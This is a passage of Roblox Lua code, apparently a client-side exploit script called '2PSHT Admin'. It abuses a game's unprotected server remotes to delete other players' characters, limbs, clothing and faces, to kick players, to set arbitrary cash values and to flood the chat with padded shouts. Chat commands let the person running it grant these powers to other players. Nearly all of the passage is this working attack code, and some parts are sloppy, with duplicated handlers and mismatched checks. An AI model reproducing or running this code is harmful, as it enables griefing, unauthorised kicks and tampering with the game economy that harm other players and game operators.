	  table.insert(moderators,playersService[v].Name)
	  adminScript.SoundFX._notification1:Play()
	  starterGui:SetCore("SendNotification", {
		Title = "2PSHT Admin | Success";
		Text = "Moderator powers given to \""..v.."\".";
		Duration = 15;
		Button1 = "Close";
	  })
	  game.Players[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kill " then
		for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
		  if playersService[v].Character.Torso:FindFirstChild("Neck") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Torso.Neck)
		  end
		  runService.RenderStepped:Wait()
		end
	  end
	  end)

	  Command20 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kill " then
		for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
		  if playersService[v].Character.Torso:FindFirstChild("Neck") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Torso.Neck)
		  end
		  runService.RenderStepped:Wait()
		end
	  end
	  end)

	  Command21 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,5+Prefix:len()) == Prefix.."cash " then
		for i,v in pairs(GetPlayer(string.split(msg, " ")[2])) do
		  b = string.split(msg, " ")[3]
		  game:GetService("ReplicatedStorage").Events.changeValue:InvokeServer(game:GetService('ReplicatedStorage').plrData[v].cash, b)
		end
	  end
	  end)

	  Command22 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,10+Prefix:len()) == Prefix.."unpackage " then
		for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
		  for x,o in pairs(playersService[v].Character:GetChildren()) do
			if o:IsA("CharacterMesh") then
			  replicatedStorage.events.destroyObject:FireServer(o)
			end
		  end
		end
	  end
	  end)

	  Command23 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,7+Prefix:len()) == Prefix.."rlimbs " then
		for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Left Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
		  end
		end
	  end
	  end)

	  Command24 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,12+Prefix:len()) == Prefix.."removelimbs " then
		for i,v in pairs(GetPlayer(string.sub(msg,13+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Left Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
		  end
		end
	  end
	  end)

	  Command25 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rarms " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		end
	  end
	  end)

	  Command26 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removearms " then
		for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		end
	  end
	  end)

	  Command27 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rlegs " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
		  end
		end
	  end
	  end)

	  Command28 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removelegs " then
		for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
		  end
		end
	  end
	  end)

	  Command29 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."naked " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Shirt") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
		  else
		  end
		  if playersService[v].Character:FindFirstChild("Pants") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
		  else
		  end
		  if playersService[v].Character:FindFirstChild("Shirt Graphic") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
		  else
		  end
		end
	  end
	  end)

	  Command30 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,7+Prefix:len()) == Prefix.."nayked " then
		for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Shirt") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
		  else
		  end
		  if playersService[v].Character:FindFirstChild("Pants") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
		  else
		  end
		  if playersService[v].Character:FindFirstChild("Shirt Graphic") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
		  else
		  end
		end
	  end
	  end)

	  Command31 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,9+Prefix:len()) == Prefix.."faceless " then
		for i,v in pairs(GetPlayer(string.sub(msg,10+Prefix:len()))) do
		  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
		end
	  end
	  end)

	  Command32 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rface " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
		  end
		end
	  end
	  end)

	  Command33 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removeface " then
		for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
		  if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
		  end
		end
	  end
	  end)

	  Command34 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rhats " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  for x,o in pairs(playersService[v].Character:GetChildren()) do
			if o:IsA("Accessory") then
			  replicatedStorage.events.destroyObject:FireServer(o)
			end
		  end
		end
	  end
	  end)

	  Command35 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removehats " then
		for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
		  for x,o in pairs(playersService[v].Character:GetChildren()) do
			if o:IsA("Accessory") then
			  replicatedStorage.events.destroyObject:FireServer(o)
			end
		  end
		end
	  end
	  end)

	  Command36 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,8+Prefix:len()) == Prefix.."creeper " then
		for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
		  if playersService[v].Character.Head:FindFirstChild("Mesh") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head.Mesh)
		  end
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		end
	  end
	  end)

	  Command37 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,8+Prefix:len()) == Prefix.."toolban " then
		for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
		  table.insert(toolbanned,playersService[v].Name)
		end
	  end
	  end)

	  Command38 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,10+Prefix:len()) == Prefix.."untoolban " then
		for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
		  for j,k in pairs(toolbanned) do
			if string.match(k,v) then
			  table.remove(toolbanned,j)
			end
		  end
		end
	  end
	  end)

	end
  end
end
end)

createCommand:Connect(function(msg)
    if msg:lower():sub(1,13+Prefix:len()) == Prefix.."unmoderator " then
    for i,v in pairs(GetPlayer(string.sub(msg,14+Prefix:len()))) do
        for j,k in pairs(moderators) do
        if string.match(k,v) then
            table.remove(moderators,j)
            Command20:Disconnect()
            Command21:Disconnect()
            Command32:Disconnect()
            Command23:Disconnect()
            Command24:Disconnect()
            Command25:Disconnect()
            Command26:Disconnect()
            Command27:Disconnect()
            Command28:Disconnect()
            Command29:Disconnect()
            Command30:Disconnect()
            Command31:Disconnect()
            Command32:Disconnect()
            Command33:Disconnect()
            Command34:Disconnect()
            Command35:Disconnect()
            Command36:Disconnect()
            Command37:Disconnect()
            Command38:Disconnect()
        end
        end
    end
    end
    end)

    createCommand:Connect(function(msg)
    if msg:lower():sub(1,6+Prefix:len()) == Prefix.."admin " then
    for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
        if playersService:FindFirstChild(v) then
        table.insert(administrators,playersService[v].Name)
        adminScript.SoundFX._notification1:Play()
        starterGui:SetCore("SendNotification", {
            Title = "2PSHT Admin | Success";
            Text = "Administrator powers given to \""..v.."\".";
            Duration = 15;
            Button1 = "Close";
        })
        Command39 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,7+Prefix:len()) == Prefix.."punish " then
            for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character)
            end
        end
        end)

        Command40 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,8+Prefix:len()) == Prefix.."ragdoll " then
            for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Humanoid") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Humanoid)
            end
            end
        end
        end)

        Command41 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kick " then
            for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
            if playersService:FindFirstChild(v) then
                replicatedStorage.events.destroyObject:FireServer(playersService[v])
            end
            end
        end
        end)

        Command42 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,4+Prefix:len()) == Prefix.."ban " then
            for i,v in pairs(GetPlayer(string.sub(msg,5+Prefix:len()))) do
            table.insert(banned,playersService[v].Name)
            end
        end
        end)

        Command43 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,6+Prefix:len()) == Prefix.."unban " then
            for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
            for j,k in pairs(banned) do
                if string.match(k,v) then
                table.remove(banned,j)
                end
            end
            end
        end
        end)

        Command44 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,3+Prefix:len()) == Prefix.."cm " then
            local ChatMessage = msg:sub(4+Prefix:len(), #msg)
            replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
            replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
        end
        end)

        Command45 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,9+Prefix:len()) == Prefix.."cmessage " then
            local ChatMessage = msg:sub(10+Prefix:len(), #msg)
            replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
            replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
        end
        end)

        Command46 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,12+Prefix:len()) == Prefix.."chatmessage " then
            local ChatMessage = msg:sub(13+Prefix:len(), #msg)
            replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
            replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
        end
        end)

        Command47 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,9+Prefix:len()) == Prefix.."loopkill " then
            for i,v in pairs(GetPlayer(string.sub(msg,10+Prefix:len()))) do
            table.insert(loopkilled,playersService[v].Name)
            end
        end
        end)

        Command48 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,11+Prefix:len()) == Prefix.."unloopkill " then
            for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
            for j,k in pairs(loopkilled) do
                if string.match(k,v) then
                table.remove(loopkilled,j)
                end
            end
            end
        end
        end)

        Command49 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kill " then
            for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
            if playersService[v].Character.Torso:FindFirstChild("Neck") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Torso.Neck)
            end
            runService.RenderStepped:Wait()
            end
        end
        end)

        Command50 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,5+Prefix:len()) == Prefix.."cash " then
            for i,v in pairs(GetPlayer(string.split(msg, " ")[2])) do
            b = string.split(msg, " ")[3]
            game:GetService("ReplicatedStorage").Events.changeValue:InvokeServer(game:GetService('ReplicatedStorage').plrData[v].cash, b)
            end
        end
        end)

        Command51 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,10+Prefix:len()) == Prefix.."unpackage " then
            for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
            for x,o in pairs(playersService[v].Character:GetChildren()) do
                if o:IsA("CharacterMesh") then
                replicatedStorage.events.destroyObject:FireServer(o)
                end
            end
            end
        end
        end)

        Command52 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,7+Prefix:len()) == Prefix.."rlimbs " then
            for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Left Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
            end
            if playersService[v].Character:FindFirstChild("Right Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
            end
            if playersService[v].Character:FindFirstChild("Left Leg") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
            end
            if playersService[v].Character:FindFirstChild("Right Leg") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
            end
            end
        end
        end)

        Command53 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,12+Prefix:len()) == Prefix.."removelimbs " then
            for i,v in pairs(GetPlayer(string.sub(msg,13+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Left Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
            end
            if playersService[v].Character:FindFirstChild("Right Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
            end
            if playersService[v].Character:FindFirstChild("Left Leg") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
            end
            if playersService[v].Character:FindFirstChild("Right Leg") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
            end
            end
        end
        end)

        Command54 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rarms " then
            for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Left Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
            end
            if playersService[v].Character:FindFirstChild("Left Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
            end
            end
        end
        end)

        Command55 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removearms " then
            for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Left Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
            end
            if playersService[v].Character:FindFirstChild("Left Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
            end
            end
        end
        end)

        Command56 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rlegs " then
            for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Left Leg") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
            end
            if playersService[v].Character:FindFirstChild("Right Leg") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
            end
            end
        end
        end)

        Command57 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removelegs " then
            for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Left Leg") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
            end
            if playersService[v].Character:FindFirstChild("Right Leg") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
            end
            end
        end
        end)

        Command58 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,6+Prefix:len()) == Prefix.."naked " then
            for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Shirt") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
            else
            end
            if playersService[v].Character:FindFirstChild("Pants") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
            else
            end
            if playersService[v].Character:FindFirstChild("Shirt Graphic") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
            else
            end
            end
        end
        end)

        Command59 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,7+Prefix:len()) == Prefix.."nayked " then
            for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
            if playersService[v].Character:FindFirstChild("Shirt") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
            else
            end
            if playersService[v].Character:FindFirstChild("Pants") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
            else
            end
            if playersService[v].Character:FindFirstChild("Shirt Graphic") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
            else
            end
            end
        end
        end)

        Command60 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,9+Prefix:len()) == Prefix.."faceless " then
            for i,v in pairs(GetPlayer(string.sub(msg,10+Prefix:len()))) do
            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
            end
        end
        end)

        Command61 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rface " then
            for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
            if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
            end
            end
        end
        end)

        Command62 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removeface " then
            for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
            if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
            end
            end
        end
        end)

        Command63 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rhats " then
            for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
            for x,o in pairs(playersService[v].Character:GetChildren()) do
                if o:IsA("Accessory") then
                replicatedStorage.events.destroyObject:FireServer(o)
                end
            end
            end
        end
        end)

        Command64 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removehats " then
            for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
            for x,o in pairs(playersService[v].Character:GetChildren()) do
                if o:IsA("Accessory") then
                replicatedStorage.events.destroyObject:FireServer(o)
                end
            end
            end
        end
        end)

        Command65 = playersService[v].Chatted:Connect(function(msg)
        if msg:lower():sub(1,8+Prefix:len()) == Prefix.."creeper " then
            for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
            if playersService[v].Character.Head:FindFirstChild("Mesh") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head.Mesh)
            end
            if playersService[v].Character:FindFirstChild("Left Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
            end
            if playersService[v].Character:FindFirstChild("Right Arm") then
                replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
            end
            end
        end
        end)

        Command66 = playersService[v].Chatted:Connect(function(msg)
            if msg:lower():sub(1,8+Prefix:len()) == Prefix.."toolban " then
                for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
                table.insert(toolbanned,playersService[v].Name)
                end
            end
        end)

        Command67 = playersService[v].Chatted:Connect(function(msg)
            if msg:lower():sub(1,10+Prefix:len()) == Prefix.."untoolban " then
                for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
                    for j,k in pairs(toolbanned) do
                        if string.match(k,v) then
                            table.remove(toolbanned,j)
                        end
                    end
                end
            end
        end)

        end
    end
end

createCommand:Connect(function(msg)
    if msg:lower():sub(1,8+Prefix:len()) == Prefix.."unadmin " then
        for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
            for j,k in pairs(administrators) do
                if string.match(k,v) then
                    table.remove(administrators,j)
                    Command39:Disconnect()
                    Command40:Disconnect()
                    Command41:Disconnect()
                    Command42:Disconnect()
                    Command43:Disconnect()
                    Command44:Disconnect()
                    Command45:Disconnect()
                    Command46:Disconnect()
                    Command47:Disconnect()
                    Command48:Disconnect()
                    Command49:Disconnect()
                    Command50:Disconnect()
                    Command51:Disconnect()
                    Command52:Disconnect()
                    Command53:Disconnect()
                    Command54:Disconnect()
                    Command55:Disconnect()
                    Command56:Disconnect()
                    Command57:Disconnect()
                    Command58:Disconnect()
                    Command59:Disconnect()
                    Command60:Disconnect()
                    Command61:Disconnect()
                    Command62:Disconnect()
                    Command63:Disconnect()
                    Command64:Disconnect()
                    Command65:Disconnect()
                    Command66:Disconnect()
                    Command67:Disconnect()
                end
            end
        end
    end
end)

createCommand:Connect(function(msg)
    if msg:lower():sub(1,14+Prefix:len()) == Prefix.."administrator " then
        for i,v in pairs(GetPlayer(string.sub(msg,15+Prefix:len()))) do
            table.insert(administrators,playersService[v].Name)
            adminScript.SoundFX._notification1:Play()
            starterGui:SetCore("SendNotification", {
            Title = "2PSHT Admin | Success";
            Text = "Administrator powers given to \""..v.."\".";
            Duration = 15;
            Button1 = "Close";
            })
            Command68 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,7+Prefix:len()) == Prefix.."punish " then
                    for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
                        replicatedStorage.events.destroyObject:FireServer(playersService[v].Character)
                    end
                end
            end)

            Command69 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,8+Prefix:len()) == Prefix.."ragdoll " then
                    for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Humanoid") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Humanoid)
                        end
                    end
                end
            end)

            Command70 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kick " then
                    for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
                        if playersService:FindFirstChild(v) then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v])
                        end
                    end
                end
            end)

            Command71 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,4+Prefix:len()) == Prefix.."ban " then
                    for i,v in pairs(GetPlayer(string.sub(msg,5+Prefix:len()))) do
                        table.insert(banned,playersService[v].Name)
                    end
                end
            end)

            Command72 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,6+Prefix:len()) == Prefix.."unban " then
                    for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
                        for j,k in pairs(banned) do
                            if string.match(k,v) then
                                table.remove(banned,j)
                            end
                        end
                    end
                end
            end)

            Comman73 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,3+Prefix:len()) == Prefix.."cm " then
                    local ChatMessage = msg:sub(4+Prefix:len(), #msg)
                    replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
                    replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
                end
            end)

            Command74 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,9+Prefix:len()) == Prefix.."cmessage " then
                    local ChatMessage = msg:sub(10+Prefix:len(), #msg)
                    replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
                    replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
                end
            end)

            Command75 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,12+Prefix:len()) == Prefix.."chatmessage " then
                    local ChatMessage = msg:sub(13+Prefix:len(), #msg)
                    replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
                    replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
                end
            end)

            Command76 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,9+Prefix:len()) == Prefix.."loopkill " then
                    for i,v in pairs(GetPlayer(string.sub(msg,10+Prefix:len()))) do
                        table.insert(loopkilled,playersService[v].Name)
                    end
                end
            end)

            Command77 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,11+Prefix:len()) == Prefix.."unloopkill " then
                    for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
                        for j,k in pairs(loopkilled) do
                            if string.match(k,v) then
                                table.remove(loopkilled,j)
                            end
                        end
                    end
                end
            end)

            Command78 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kill " then
                    for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
                        if playersService[v].Character.Torso:FindFirstChild("Neck") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Torso.Neck)
                        end
                        runService.RenderStepped:Wait()
                    end
                end
            end)

            Command79 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,5+Prefix:len()) == Prefix.."cash " then
                    for i,v in pairs(GetPlayer(string.split(msg, " ")[2])) do
                        b = string.split(msg, " ")[3]
                        game:GetService("ReplicatedStorage").Events.changeValue:InvokeServer(game:GetService('ReplicatedStorage').plrData[v].cash, b)
                    end
                end
            end)

            Command80 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,10+Prefix:len()) == Prefix.."unpackage " then
                    for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
                        for x,o in pairs(playersService[v].Character:GetChildren()) do
                            if o:IsA("CharacterMesh") then
                                replicatedStorage.events.destroyObject:FireServer(o)
                            end
                        end
                    end
                end
            end)

            Command81 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,7+Prefix:len()) == Prefix.."rlimbs " then
                    for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Left Arm") then
